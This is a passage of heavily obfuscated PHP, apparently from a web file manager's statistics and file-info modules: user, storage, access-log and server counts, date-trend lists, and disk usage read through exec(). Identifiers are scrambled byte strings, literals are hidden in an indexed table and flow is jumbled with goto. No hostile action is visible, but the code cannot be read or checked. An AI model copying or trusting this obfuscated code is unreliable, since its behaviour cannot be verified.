$b—˘˘∆£ÑÊ[687], $b—˘˘∆£ÑÊ[1941], $b—˘˘∆£ÑÊ[1942])), $b—˘˘∆£ÑÊ[1943] => array($b—˘˘∆£ÑÊ[29] => $b—˘˘∆£ÑÊ[1944], $b—˘˘∆£ÑÊ[258] => array($b—˘˘∆£ÑÊ[207], $b—˘˘∆£ÑÊ[685], $b—˘˘∆£ÑÊ[1945], $b—˘˘∆£ÑÊ[1946], $b—˘˘∆£ÑÊ[1947]))); if (!isset($bÃ√Á•∂Ò†[$BÂé¿‘≥π·])) { return !1; } $this->optionType = $bÃ√Á•∂Ò†[$BÂé¿‘≥π·][$b—˘˘∆£ÑÊ[29]]; $this->field = $bÃ√Á•∂Ò†[$BÂé¿‘≥π·][$b—˘˘∆£ÑÊ[258]]; return !0; } public function listData($e”¬îã”ˆÀ = false, $d‡œãö⁄≤œ = "\155\x6f\x64\151\146\x79\x54\x69\155\x65", $dõ∏ƒ¯≥å“ = false) { return parent::listData($e”¬îã”ˆÀ, $d‡œãö⁄≤œ, $dõ∏ƒ¯≥å“); } public function trendList($AÍ‡ˆª…´ú) { goto F¡ÂØ®µÜÖ; aµåÀ÷ù∂≥: if (!isset($AÔ∞∏ñÌö„)) { $b«î“öë™© = $AÍ‡ˆª…´ú == $AàıÃ›µﬂ¢[527] ? $AàıÃ›µﬂ¢[469] : $AàıÃ›µﬂ¢[749]; $AÔ∞∏ñÌö„ = Model($b«î“öë™©)->min($AàıÃ›µﬂ¢[184]); } $eóö‰∫øŸ≈ = $AàıÃ›µﬂ¢[1950] . ucfirst($AÍ‡ˆª…´ú); $Aƒ°—„‰™ò = $this->dateList($AÔ∞∏ñÌö„); goto AÏÍ‡ƒ…Ö∫; F¡ÂØ®µÜÖ: $AàıÃ›µﬂ¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; $d≠©Ñ∑Í∑ë = $this->listData(); if ($d≠©Ñ∑Í∑ë) { $a÷µÙ‹ú¿è = end($d≠©Ñ∑Í∑ë); $e£–‚¥äﬁæ = date($AàıÃ›µﬂ¢[1948], strtotime($AàıÃ›µﬂ¢[1949])); if ($a÷µÙ‹ú¿è[$AàıÃ›µﬂ¢[207]] == $e£–‚¥äﬁæ) { return $d≠©Ñ∑Í∑ë; } $AÔ∞∏ñÌö„ = strtotime($a÷µÙ‹ú¿è[$AàıÃ›µﬂ¢[207]]); } goto aµåÀ÷ù∂≥; AÏÍ‡ƒ…Ö∫: foreach ($Aƒ°—„‰™ò as $e£–‚¥äﬁæ) { $this->{$eóö‰∫øŸ≈}($e£–‚¥äﬁæ); } return $this->listData(); goto FÂÏº◊¨∑à; FÂÏº◊¨∑à: } private function dateList($eè˘•¶†çõ) { $AÎ‚üüÌáô =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bˆ´ûƒ´≈´ = $eè˘•¶†çõ; $AÑõÃ…„„Ó = strtotime($AÎ‚üüÌáô[1949]); $Cƒ™Ùä÷ÌÑ = array(); while ($Bˆ´ûƒ´≈´ <= $AÑõÃ…„„Ó) { $Cƒ™Ùä÷ÌÑ[] = date($AÎ‚üüÌáô[1948], $Bˆ´ûƒ´≈´); $Bˆ´ûƒ´≈´ = strtotime($AÎ‚üüÌáô[1951], $Bˆ´ûƒ´≈´); } return $Cƒ™Ùä÷ÌÑ; } public function _recordUser($FÍ•‘ùÂüÛ = '') { goto B˘˘è·ò–œ; b∫–éÀœ•∫: $C¨‘‹é¨≠‘ = Model($b ∑®Ò‡ò∂[469])->where($bûê…æïÚ»)->count($b ∑®Ò‡ò∂[1349]); $bûê…æïÚ»[$b ∑®Ò‡ò∂[29]] = $b ∑®Ò‡ò∂[1954]; $CÕ£àùÓ‹Ì = Model($b ∑®Ò‡ò∂[1955])->where($bûê…æïÚ»)->count($b ∑®Ò‡ò∂[1956]); goto e÷Ÿ¢Ÿ“ñ•; B˘˘è·ò–œ: $b ∑®Ò‡ò∂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÇàä∫üËã = strtotime(date($b ∑®Ò‡ò∂[1952], strtotime($FÍ•‘ùÂüÛ))); $Céπ‡º…é¬ = strtotime(date($b ∑®Ò‡ò∂[1953], strtotime($FÍ•‘ùÂüÛ))); goto E∆≤À‰ÆÏ≠; E∆≤À‰ÆÏ≠: $bûê…æïÚ» = array($b ∑®Ò‡ò∂[184] => array($b ∑®Ò‡ò∂[925], $Céπ‡º…é¬)); $E≥çñœØä≤ = Model($b ∑®Ò‡ò∂[469])->where($bûê…æïÚ»)->count($b ∑®Ò‡ò∂[1349]); $bûê…æïÚ»[$b ∑®Ò‡ò∂[184]] = array($b ∑®Ò‡ò∂[318], array($cÇàä∫üËã, $Céπ‡º…é¬)); goto b∫–éÀœ•∫; e÷Ÿ¢Ÿ“ñ•: $C‡ïé¿ˆø» = array($b ∑®Ò‡ò∂[207] => $FÍ•‘ùÂüÛ, $b ∑®Ò‡ò∂[687] => (int) $E≥çñœØä≤, $b ∑®Ò‡ò∂[1941] => (int) $C¨‘‹é¨≠‘, $b ∑®Ò‡ò∂[1942] => (int) $CÕ£àùÓ‹Ì); return $this->insert($C‡ïé¿ˆø»); goto B◊«ˆô±ü¶; B◊«ˆô±ü¶: } public function _recordStore($Dïõ „ééΩ = '') { goto FﬂÕî∫Ëﬁ¬; eÊÙé§Æù¶: $eÜìÿòÊçÏ = Model($E‚üËè⁄ê“[749])->where($FÑŒÀ¢è´´)->sum($E‚üËè⁄ê“[78]); $féÔ∂Ωí∆“ = array($E‚üËè⁄ê“[207] => $Dïõ „ééΩ, $E‚üËè⁄ê“[685] => (int) $eŸ·äÌË•‹, $E‚üËè⁄ê“[1945] => (int) $E¯ö÷é“íä, $E‚üËè⁄ê“[1946] => (int) $f∫ÿÕ∑¢ò§, $E‚üËè⁄ê“[1947] => (int) $eÜìÿòÊçÏ); return $this->insert($féÔ∂Ωí∆“); goto bßîàÉÔ´Ç; eÓù∑«Æíæ: $FÑŒÀ¢è´´[$E‚üËè⁄ê“[368]] = 1; $f∫ÿÕ∑¢ò§ = Model($E‚üËè⁄ê“[749])->where($FÑŒÀ¢è´´)->sum($E‚üËè⁄ê“[78]); $FÑŒÀ¢è´´[$E‚üËè⁄ê“[368]] = 2; goto eÊÙé§Æù¶; Aäâè≈Õ¯Ã: $E¯ö÷é“íä = Model($E‚üËè⁄ê“[418])->where($FÑŒÀ¢è´´)->sum($E‚üËè⁄ê“[78]); $FÑŒÀ¢è´´[$E‚üËè⁄ê“[367]] = 0; $eŸ·äÌË•‹ = Model($E‚üËè⁄ê“[749])->where($FÑŒÀ¢è´´)->sum($E‚üËè⁄ê“[78]); goto eÓù∑«Æíæ; FﬂÕî∫Ëﬁ¬: $E‚üËè⁄ê“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÿúóÔéÕä = strtotime(date($E‚üËè⁄ê“[1953], strtotime($Dïõ „ééΩ))); $FÑŒÀ¢è´´ = array($E‚üËè⁄ê“[184] => array($E‚üËè⁄ê“[925], $FÿúóÔéÕä)); goto Aäâè≈Õ¯Ã; bßîàÉÔ´Ç: } public function trend($aâü´ÙÀê¯, $dÖ∏ÍÖÊ¶ì) { goto bÇèÍ◊¶øñ; C‡‘µ≈Ì…á: return $dÂ—ÂÍ´°–; goto eΩèâ¢°¨—; f´÷õÌê¯è: if ($AªõÃ≥¢—ı && $dÖ∏ÍÖÊ¶ì != $EŸ∂ïáæ¶À[1324]) { $e¥•⁄úö¨Õ = $AªõÃ≥¢—ı[0][$EŸ∂ïáæ¶À[207]]; $cñÎ¨œ†∞à = $this->validDate($dÖ∏ÍÖÊ¶ì, $e¥•⁄úö¨Õ); $Eìµ≥‚Ø±© = array(); $CΩæ†¯—„œ = array_to_keyvalue($AªõÃ≥¢—ı, $EŸ∂ïáæ¶À[207]); foreach ($cñÎ¨œ†∞à as $C†≠»ò≥‹⁄) { if (isset($CΩæ†¯—„œ[$C†≠»ò≥‹⁄])) { $d±ºÜáÏä‘ = $CΩæ†¯—„œ[$C†≠»ò≥‹⁄]; } else { $d±ºÜáÏä‘ = end($AªõÃ≥¢—ı); $d±ºÜáÏä‘[$EŸ∂ïáæ¶À[207]] = $C†≠»ò≥‹⁄; if ($aâü´ÙÀê¯ == $EŸ∂ïáæ¶À[527]) { $d±ºÜáÏä‘[$EŸ∂ïáæ¶À[1941]] = $d±ºÜáÏä‘[$EŸ∂ïáæ¶À[1942]] = 0; } } $Eìµ≥‚Ø±©[] = $d±ºÜáÏä‘; } $AªõÃ≥¢—ı = $Eìµ≥‚Ø±©; } $B«◊¨áÙ◊Ã = array($EŸ∂ïáæ¶À[527] => array($EŸ∂ïáæ¶À[687] => LNG($EŸ∂ïáæ¶À[1957]), $EŸ∂ïáæ¶À[1941] => LNG($EŸ∂ïáæ¶À[1958]), $EŸ∂ïáæ¶À[1942] => LNG($EŸ∂ïáæ¶À[1959])), $EŸ∂ïáæ¶À[1943] => array($EŸ∂ïáæ¶À[685] => LNG($EŸ∂ïáæ¶À[1960]), $EŸ∂ïáæ¶À[1945] => LNG($EŸ∂ïáæ¶À[1961]), $EŸ∂ïáæ¶À[1946] => LNG($EŸ∂ïáæ¶À[1962]), $EŸ∂ïáæ¶À[1947] => LNG($EŸ∂ïáæ¶À[1963]))); $Eêóïããñ∆ = array($EŸ∂ïáæ¶À[527] => $EŸ∂ïáæ¶À[1964], $EŸ∂ïáæ¶À[1943] => $EŸ∂ïáæ¶À[78]); goto cπÌÁî¶ƒ; bÇèÍ◊¶øñ: $EŸ∂ïáæ¶À =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->init($aâü´ÙÀê¯)) { return !1; } $AªõÃ≥¢—ı = $this->trendList($aâü´ÙÀê¯); goto f´÷õÌê¯è; cπÌÁî¶ƒ: if (empty($AªõÃ≥¢—ı)) { $C†≠»ò≥‹⁄ = date($EŸ∂ïáæ¶À[1948], strtotime($EŸ∂ïáæ¶À[1949])); $AÖã‰§ÔÆ® = array($EŸ∂ïáæ¶À[207] => $C†≠»ò≥‹⁄); foreach ($B«◊¨áÙ◊Ã[$aâü´ÙÀê¯] as $CóœáÍÉÆƒ => $dÕÉê»èí∂) { $AÖã‰§ÔÆ®[$CóœáÍÉÆƒ] = 0; } $AªõÃ≥¢—ı[] = $AÖã‰§ÔÆ®; } $dÂ—ÂÍ´°– = array(); foreach ($AªõÃ≥¢—ı as $dÕÉê»èí∂) { if ($aâü´ÙÀê¯ == $EŸ∂ïáæ¶À[1943] && $dÕÉê»èí∂[$EŸ∂ïáæ¶À[1945]] > $dÕÉê»èí∂[$EŸ∂ïáæ¶À[685]]) { $dÕÉê»èí∂[$EŸ∂ïáæ¶À[1945]] = $dÕÉê»èí∂[$EŸ∂ïáæ¶À[685]]; } foreach ($B«◊¨áÙ◊Ã[$aâü´ÙÀê¯] as $CóœáÍÉÆƒ => $eãù¡ÑôÆ…) { $d±ºÜáÏä‘ = array($EŸ∂ïáæ¶À[207] => $dÕÉê»èí∂[$EŸ∂ïáæ¶À[207]], $EŸ∂ïáæ¶À[1248] => $eãù¡ÑôÆ…); $d±ºÜáÏä‘[$Eêóïããñ∆[$aâü´ÙÀê¯]] = isset($dÕÉê»èí∂[$CóœáÍÉÆƒ]) ? $dÕÉê»èí∂[$CóœáÍÉÆƒ] : 0; $dÂ—ÂÍ´°–[] = $d±ºÜáÏä‘; } } goto C‡‘µ≈Ì…á; eΩèâ¢°¨—: } public function validDate($D„Ñƒõá¢Î, $eê·ÆÍ ‹à) { goto fâó©◊ÉÀ˘; f¶ıÚ√ú¿‚: return $DÖ‰‘ß‘†—; goto A´¨©ı€ËÖ; fõ˘Ï∆°°´: switch ($D„Ñƒõá¢Î) { case $F¬≠¥€«¶í[1331]: $B≠àÓ£Ùõè = mktime(0, 0, 0, date($F¬≠¥€«¶í[1965]), date($F¬≠¥€«¶í[1966]) - date($F¬≠¥€«¶í[1192]) + 7 - 7, date($F¬≠¥€«¶í[1967])); $Fﬁﬁ‡éúæê = 0; do { $Dè ™‡ÎŒÍ = date($F¬≠¥€«¶í[1948], $B≠àÓ£Ùõè - 3600 * 24 * 7 * $Fﬁﬁ‡éúæê); $DÖ‰‘ß‘†—[] = $Dè ™‡ÎŒÍ; $Fﬁﬁ‡éúæê++; } while ($eê·ÆÍ ‹à < $Dè ™‡ÎŒÍ); break; case $F¬≠¥€«¶í[1329]: $Fﬁﬁ‡éúæê = 1; do { $a°≤ÃﬂØ÷± = date($F¬≠¥€«¶í[1968], strtotime("\x2d\40{$Fﬁﬁ‡éúæê}\x20\155\157\156\164\150\x73")); $DÖ‰‘ß‘†—[] = $a°≤ÃﬂØ÷±; $Fﬁﬁ‡éúæê++; } while ($eê·ÆÍ ‹à < $a°≤ÃﬂØ÷±); break; case $F¬≠¥€«¶í[1632]: $dñıÏ∞èèâ = (int) date($F¬≠¥€«¶í[1967], strtotime($eê·ÆÍ ‹à)); $Dö¿¯ëûä„ = (int) date($F¬≠¥€«¶í[1967]); if ($dñıÏ∞èèâ >= $Dö¿¯ëûä„) { break; } for ($dñıÏ∞èèâ; $dñıÏ∞èèâ < $Dö¿¯ëûä„; $dñıÏ∞èèâ++) { $DÖ‰‘ß‘†—[] = $dñıÏ∞èèâ . $F¬≠¥€«¶í[1969]; } break; default: break; } if ($eê·ÆÍ ‹à > end($DÖ‰‘ß‘†—)) { array_pop($DÖ‰‘ß‘†—); } sort($DÖ‰‘ß‘†—); goto f¶ıÚ√ú¿‚; fâó©◊ÉÀ˘: $F¬≠¥€«¶í =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÊ€∂¥ ≈á = date($F¬≠¥€«¶í[1948], strtotime($F¬≠¥€«¶í[1949])); $DÖ‰‘ß‘†— = array($EÊ€∂¥ ≈á); goto fõ˘Ï∆°°´; A´¨©ı€ËÖ: } public function listTable($AÌÀèäÁî≈) { $Fó’ä≠÷˘◊ = ucfirst($AÌÀèäÁî≈); return Model($Fó’ä≠÷˘◊)->listData(); } public function option($FˆÕï“ó¬Ñ) { $d∂µﬁê÷ã˜ = $_SERVER[£¿ÌÙëü¡¯¯][1970] . ucfirst($FˆÕï“ó¬Ñ); return $this->{$d∂µﬁê÷ã˜}(); } private function optionUser() { goto DˆøçÔ„®â; Eêê€üÏôù: $c— ëáÜ™◊ = strtotime($C±±åÇ∫é“[1972]); $d”¢◊ë˘¯Ñ = array($C±±åÇ∫é“[1973] => array($C±±åÇ∫é“[926], $c— ëáÜ™◊)); $F¨°ÚËÙñÛ = (int) Model($C±±åÇ∫é“[469])->where($d”¢◊ë˘¯Ñ)->count($C±±åÇ∫é“[1349]); goto c€““‹¶ﬁê; DˆøçÔ„®â: $C±±åÇ∫é“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $F±íç¡˘ã≤ = Model($C±±åÇ∫é“[469])->count($C±±åÇ∫é“[1349]); $Aª√ßÁµÇ€ = Model($C±±åÇ∫é“[469])->where($C±±åÇ∫é“[1971])->count($C±±åÇ∫é“[1349]); goto Eêê€üÏôù; c€““‹¶ﬁê: if (!$F¨°ÚËÙñÛ) { $F¨°ÚËÙñÛ = 1; } $c— ëáÜ™◊ = strtotime(date($C±±åÇ∫é“[1952])); $d”¢◊ë˘¯Ñ = array($C±±åÇ∫é“[1973] => array($C±±åÇ∫é“[926], $c— ëáÜ™◊)); goto Fó∑áó±≥•; Fó∑áó±≥•: $béæàäô—ª = Model($C±±åÇ∫é“[469])->where($d”¢◊ë˘¯Ñ)->count($C±±åÇ∫é“[1349]); return array($C±±åÇ∫é“[682] => (int) $F±íç¡˘ã≤, $C±±åÇ∫é“[1974] => (int) ($F±íç¡˘ã≤ - $Aª√ßÁµÇ€), $C±±åÇ∫é“[1975] => (int) $Aª√ßÁµÇ€, $C±±åÇ∫é“[1976] => (int) $béæàäô—ª, $C±±åÇ∫é“[1977] => $F¨°ÚËÙñÛ); goto fÑ§ÇÃòáÊ; fÑ§ÇÃòáÊ: } private function optionFile() { goto E≈œÕºßÔò; b€úÔ‘µµ‹: $Cô˘–Éåú∆ = $aß¯⁄ı€®¡[$b∑ì¿„Û∞Ú[1945]]; $Cù‹Ü∂√à’ = Model($b∑ì¿„Û∞Ú[749])->where(array($b∑ì¿„Û∞Ú[367] => 0))->count($b∑ì¿„Û∞Ú[366]); $A¯Ö‡†ã ª = array($b∑ì¿„Û∞Ú[367] => 0, $b∑ì¿„Û∞Ú[184] => array($b∑ì¿„Û∞Ú[926], strtotime(date($b∑ì¿„Û∞Ú[1952])))); goto Féﬂ¬›ëÛ≠; E≈œÕºßÔò: $b∑ì¿„Û∞Ú =& $_SERVER[£¿ÌÙëü¡¯¯]; $aß¯⁄ı€®¡ = $this->sourceSize(); $a∏ÜπËﬂ»ù = $aß¯⁄ı€®¡[$b∑ì¿„Û∞Ú[78]]; goto b€úÔ‘µµ‹; Féﬂ¬›ëÛ≠: $FÌÁå¬ííá = Model($b∑ì¿„Û∞Ú[749])->where($A¯Ö‡†ã ª)->sum($b∑ì¿„Û∞Ú[78]); $CòÒ¢“Ìõé = Model($b∑ì¿„Û∞Ú[749])->where($A¯Ö‡†ã ª)->count($b∑ì¿„Û∞Ú[366]); return array($b∑ì¿„Û∞Ú[685] => $a∏ÜπËﬂ»ù, $b∑ì¿„Û∞Ú[1945] => $Cô˘–Éåú∆, $b∑ì¿„Û∞Ú[1978] => $a∏ÜπËﬂ»ù - $Cô˘–Éåú∆, $b∑ì¿„Û∞Ú[1979] => (int) $FÌÁå¬ííá, $b∑ì¿„Û∞Ú[687] => (int) $Cù‹Ü∂√à’, $b∑ì¿„Û∞Ú[1980] => (int) $CòÒ¢“Ìõé); goto eÛÁÊó€ºï; eÛÁÊó€ºï: } private function optionAccess() { $e∫…ëÓÆïæ =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($e∫…ëÓÆïæ[682] => $this->typeLogCnt(), $e∫…ëÓÆïæ[92] => $this->typeLogCnt($e∫…ëÓÆïæ[92]), $e∫…ëÓÆïæ[400] => $this->typeLogCnt($e∫…ëÓÆïæ[400]), $e∫…ëÓÆïæ[1981] => $this->typeLogCnt($e∫…ëÓÆïæ[1981]), $e∫…ëÓÆïæ[1982] => $this->typeLogCnt($e∫…ëÓÆïæ[1982]), $e∫…ëÓÆïæ[527] => $this->typeLogCnt($e∫…ëÓÆïæ[33], $e∫…ëÓÆïæ[1956])); } private function typeLogCnt($Dºƒ‘œ„ÚÚ = '', $CñµπΩí€ñ = "\x69\144") { goto eìÚ¿ÛΩÑÍ; eìÚ¿ÛΩÑÍ: $eÕ“≥öû±é =& $_SERVER[£¿ÌÙëü¡¯¯]; $D§œàë≥© = array($eÕ“≥öû±é[92] => array($eÕ“≥öû±é[1983], $eÕ“≥öû±é[1984]), $eÕ“≥öû±é[400] => array($eÕ“≥öû±é[1985]), $eÕ“≥öû±é[1981] => array($eÕ“≥öû±é[1986], $eÕ“≥öû±é[1987]), $eÕ“≥öû±é[1982] => array($eÕ“≥öû±é[1988], $eÕ“≥öû±é[1989]), $eÕ“≥öû±é[1990] => array($eÕ“≥öû±é[1991], $eÕ“≥öû±é[1992], $eÕ“≥öû±é[1993])); $Bòáè˘–„¨ = strtotime(date($eÕ“≥öû±é[1952])); goto E«Ùé¥ìÙ¯; E«Ùé¥ìÙ¯: $Dë∑‡≈àÛ∏ = array($eÕ“≥öû±é[184] => array($eÕ“≥öû±é[926], $Bòáè˘–„¨)); if ($Dºƒ‘œ„ÚÚ) { $Dë∑‡≈àÛ∏[$eÕ“≥öû±é[29]] = array($eÕ“≥öû±é[7], $D§œàë≥©[$Dºƒ‘œ„ÚÚ]); } $EÔÌÉæÿ≥ñ = Model($eÕ“≥öû±é[1955])->where($Dë∑‡≈àÛ∏)->count($CñµπΩí€ñ); goto Fá≥®Áãﬁ⁄; Fá≥®Áãﬁ⁄: return (int) $EÔÌÉæÿ≥ñ; goto cÔ˜®ïﬁ’≈; cÔ˜®ïﬁ’≈: } private function optionServer() { goto EØ˜ôÇ°©ã; EØ˜ôÇ°©ã: $EËÙıÈ´§“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $C„¬íù‰Ì„ = $this->diskDriver(); $Eº¶◊Èêı˘ = KodIO::defaultDriver(); goto eãıé√πôò; eñÙΩíÇ£ç: return array($EËÙıÈ´§“[1996] => $C„¬íù‰Ì„ ? $C„¬íù‰Ì„[$EËÙıÈ´§“[1997]] : 0, $EËÙıÈ´§“[1998] => $C„¬íù‰Ì„ ? $C„¬íù‰Ì„[$EËÙıÈ´§“[1999]] : 0, $EËÙıÈ´§“[2000] => (int) $Eº¶◊Èêı˘[$EËÙıÈ´§“[1997]] * 1024 * 1024 * 1024, $EËÙıÈ´§“[2001] => (int) $e‰»∆ˆπÌ°, $EËÙıÈ´§“[2002] => ucfirst($b’¡òæ—œ∞), $EËÙıÈ´§“[2003] => $EËÙıÈ´§“[2004] . PHP_VERSION, $EËÙıÈ´§“[2005] => phpBuild64() ? 64 : 32, $EËÙıÈ´§“[681] => str_replace($EËÙıÈ´§“[2006], $EËÙıÈ´§“[902], $DÌ¡®ﬁ•£‚), $EËÙıÈ´§“[334] => ucfirst($B•ÿàãºﬁ∂), $EËÙıÈ´§“[28] => $_SERVER[$EËÙıÈ´§“[2007]]); goto BµÁÁ√¡ó≤; CÛŸ´ÚˆπÃ: if ($DÌ¡®ﬁ•£‚ == $EËÙıÈ´§“[721]) { $bˆâÈãä˘∆ = explode($EËÙıÈ´§“[722], $b¶™√Û¶îè[$EËÙıÈ´§“[723]]); $DÌ¡®ﬁ•£‚ = $bˆâÈãä˘∆[0]; } if ($DÌ¡®ﬁ•£‚ == $EËÙıÈ´§“[822] || $DÌ¡®ﬁ•£‚ == $EËÙıÈ´§“[703]) { $C∂û¬÷à–˜ = Model()->db()->query($EËÙıÈ´§“[1994]); $Bá†Û¬Î™À = $C∂û¬÷à–˜[0] && isset($C∂û¬÷à–˜[0][$EËÙıÈ´§“[1247]]) ? $C∂û¬÷à–˜[0][$EËÙıÈ´§“[1247]] : 0; $DÌ¡®ﬁ•£‚ = $EËÙıÈ´§“[1995] . ($Bá†Û¬Î™À ? $EËÙıÈ´§“[8] . $Bá†Û¬Î™À : $EËÙıÈ´§“[33]); } $B•ÿàãºﬁ∂ = $GLOBALS[$EËÙıÈ´§“[6]][$EËÙıÈ´§“[334]][$EËÙıÈ´§“[750]]; goto eñÙΩíÇ£ç; Eõ∆‰ò’åå: $b’¡òæ—œ∞ = $bè£ıΩ≈Úî[0]; $b¶™√Û¶îè = $GLOBALS[$EËÙıÈ´§“[6]][$EËÙıÈ´§“[17]]; $DÌ¡®ﬁ•£‚ = $b¶™√Û¶îè[$EËÙıÈ´§“[720]]; goto CÛŸ´ÚˆπÃ; eãıé√πôò: $EÇœËÉ¡Ê† = array($EËÙıÈ´§“[710] => $Eº¶◊Èêı˘[$EËÙıÈ´§“[364]]); $e‰»∆ˆπÌ° = Model($EËÙıÈ´§“[418])->where($EÇœËÉ¡Ê†)->sum($EËÙıÈ´§“[78]); $bè£ıΩ≈Úî = explode($EËÙıÈ´§“[50], $_SERVER[$EËÙıÈ´§“[138]]); goto Eõ∆‰ò’åå; BµÁÁ√¡ó≤: } private function diskDriver() { goto d®Ñ∏◊œÓÉ; aπ‰ŸùåäÛ: if ($e∞œ∏«ª≤¨) { $dÁô£∞¢•¡ = $Dß¶‚ö®™∂[2010]; if (function_exists($Dß¶‚ö®™∂[2011])) { exec($Dß¶‚ö®™∂[2012], $d‡•ëá‰’¡); $dÁô£∞¢•¡ = $d‡•ëá‰’¡[1] . $Dß¶‚ö®™∂[8]; } } if (!file_exists($dÁô£∞¢•¡)) { return; } $bÒÛ¡¿ä≠” = @disk_total_space($dÁô£∞¢•¡); goto Dû–ê•ìÂ; Dû–ê•ìÂ: $EÚ»óçèî = $bÒÛ¡¿ä≠” - @disk_free_space($dÁô£∞¢•¡); return array($Dß¶‚ö®™∂[1997] => $bÒÛ¡¿ä≠”, $Dß¶‚ö®™∂[1999] => $EÚ»óçèî); goto d‰“ü»Ü¿Ñ; d®Ñ∏◊œÓÉ: $Dß¶‚ö®™∂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÁô£∞¢•¡ = $Dß¶‚ö®™∂[8]; $e∞œ∏«ª≤¨ = $GLOBALS[$Dß¶‚ö®™∂[6]][$Dß¶‚ö®™∂[2008]] == $Dß¶‚ö®™∂[2009]; goto aπ‰ŸùåäÛ; d‰“ü»Ü¿Ñ: } public function fileChart($E˜¶√ı«˜ó) { goto dñÖå´Ûƒë; CÁ•Úπê∏Î: $d’ç…ó–ˆí[$F∆…Ô◊≠õ‹[368]] = 2; $D˘˘∂Ç˜òÙ = Model($F∆…Ô◊≠õ‹[749])->where($d’ç…ó–ˆí)->sum($F∆…Ô◊≠õ‹[78]); return array($F∆…Ô◊≠õ‹[685] => $eÌ‡·Ç›÷∞[$F∆…Ô◊≠õ‹[78]], $F∆…Ô◊≠õ‹[1945] => $eÌ‡·Ç›÷∞[$F∆…Ô◊≠õ‹[1945]], $F∆…Ô◊≠õ‹[1946] => (int) $e≠¥è°€î, $F∆…Ô◊≠õ‹[1947] => (int) $D˘˘∂Ç˜òÙ); goto CåìøµÒ«ç; dñÖå´Ûƒë: $F∆…Ô◊≠õ‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($E˜¶√ı«˜ó[$F∆…Ô◊≠õ‹[1349]])) { return Model($F∆…Ô◊≠õ‹[749])->userFileTypeProfile($E˜¶√ı«˜ó[$F∆…Ô◊≠õ‹[1349]]); } if (isset($E˜¶√ı«˜ó[$F∆…Ô◊≠õ‹[2013]])) { return Model($F∆…Ô◊≠õ‹[749])->groupFileTypeProfile($E˜¶√ı«˜ó[$F∆…Ô◊≠õ‹[2013]]); } goto aî≥‰íÕòƒ; aî≥‰íÕòƒ: $eÌ‡·Ç›÷∞ = $this->sourceSize(); $d’ç…ó–ˆí = array($F∆…Ô◊≠õ‹[457] => 0, $F∆…Ô◊≠õ‹[368] => 1); $e≠¥è°€î = Model($F∆…Ô◊≠õ‹[749])->where($d’ç…ó–ˆí)->sum($F∆…Ô◊≠õ‹[78]); goto CÁ•Úπê∏Î; CåìøµÒ«ç: } private function sourceSize() { $Fü±œò´™ö =& $_SERVER[£¿ÌÙëü¡¯¯]; $eΩêõêü¶÷ = Model($Fü±œò´™ö[749])->where(array($Fü±œò´™ö[367] => 0))->sum($Fü±œò´™ö[78]); $dïºÛ¢Üﬂ± = Model($Fü±œò´™ö[418])->sum($Fü±œò´™ö[78]); if ($dïºÛ¢Üﬂ± > $eΩêõêü¶÷) { $dïºÛ¢Üﬂ± = $eΩêõêü¶÷; } return array($Fü±œò´™ö[78] => (int) $eΩêõêü¶÷, $Fü±œò´™ö[1945] => (int) $dïºÛ¢Üﬂ±); } } goto A∑»ÌàüﬁÁ; C—¥¨Êﬂ°: class GetInfo { private static $fileTypeArray; public static function get($eñı…ÿÈÎ‰) { $f§ÜﬁŸóŒ° = IO::info($eñı…ÿÈÎ‰); return self::infoAdd($f§ÜﬁŸóŒ°); } public static function infoAdd(&$F·á‘ãıÆÒ) { goto E¿Üø˘˘ïµ; f·ÍÁ≠¶á«: if (!$F·á‘ãıÆÒ || $F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[29]] != $E…´⁄ºá‘Ÿ[164]) { return; } if (!self::support($F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[157]]) || isset($F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[422]])) { return; } $BÒ≠ÂÓ¢ûñ = $E…´⁄ºá‘Ÿ[1519] . $F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[76]]; goto F¥öãΩΩù–; DŒÆÔÁÃŸÑ: $C•¢£ªøçŸ[$E…´⁄ºá‘Ÿ[369]] = $Fì≠ûèÛïÊ; $F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[422]] = $C•¢£ªøçŸ; return $F·á‘ãıÆÒ; goto A‘Üò…øìß; F¥öãΩΩù–: $Fì≠ûèÛïÊ = $F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[157]]; try { if ($F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[157]] == $E…´⁄ºá‘Ÿ[1520]) { $C•¢£ªøçŸ = self::psdParse($BÒ≠ÂÓ¢ûñ); $Fì≠ûèÛïÊ = $E…´⁄ºá‘Ÿ[1521]; } else { if ($F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[157]] == $E…´⁄ºá‘Ÿ[1522]) { $C•¢£ªøçŸ = self::pdfParse($BÒ≠ÂÓ¢ûñ); } else { $Fì≠ûèÛïÊ = self::$fileTypeArray[$E…´⁄ºá‘Ÿ[1523]][$F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[157]]]; $dË∫Íºë∑ó = self::$fileTypeArray[$E…´⁄ºá‘Ÿ[1524]][$Fì≠ûèÛïÊ][$E…´⁄ºá‘Ÿ[1525]]; $fÀ†ï £Ω∫ = @$FﬁçΩ√ÍˆÇ->analyze($BÒ≠ÂÓ¢ûñ, $F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[78]], $F·á‘ãıÆÒ[$E…´⁄ºá‘Ÿ[28]]); $C•¢£ªøçŸ = self::parseData($fÀ†ï £Ω∫, $dË∫Íºë∑ó, $F·á‘ãıÆÒ); } } } catch (Exception $c‰Ö°“å®‹) { $C•¢£ªøçŸ = array($E…´⁄ºá‘Ÿ[369] => $Fì≠ûèÛïÊ); } if (!$C•¢£ªøçŸ) { return; } goto DŒÆÔÁÃŸÑ; E¿Üø˘˘ïµ: $E…´⁄ºá‘Ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; static $FﬁçΩ√ÍˆÇ; if 